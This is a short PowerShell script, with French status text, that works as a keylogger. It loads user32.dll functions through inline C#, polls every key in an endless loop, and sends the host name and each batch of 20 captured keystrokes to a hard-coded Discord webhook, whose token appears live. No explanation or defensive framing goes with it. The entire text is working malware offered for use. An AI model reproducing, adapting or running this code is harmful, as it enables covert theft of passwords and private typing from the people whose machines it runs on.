$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger natif actif – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

Add-Type @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
    [DllImport("user32.dll")] public static extern int MapVirtualKey(int uCode, int uMapType);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 2)] System.Text.StringBuilder lpChar, int cchBuff, uint wFlags);
}
'@

$buf = ''
while($true){
    Start-Sleep -m 40
    for($i=8;$i -le 254;$i++){
        if([K]::GetAsyncKeyState($i) -eq -32767){
            $sb = New-Object System.Text.StringBuilder
            $shift = [K]::GetAsyncKeyState(0x10) -ne 0
            [K]::ToUnicode($i, [K]::MapVirtualKey($i,0), (New-Object byte[] 256), $sb, 2, 0) | Out-Null
            $char = $sb.ToString()
            if($char.Length -eq 0){ $char = [char]$i }
            if($shift){ $char = $char.ToUpper() } else { $char = $char.ToLower() }
            $buf += $char
            if($buf.Length -ge 20){
                iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                $buf = ''
            }
        }
    }
}
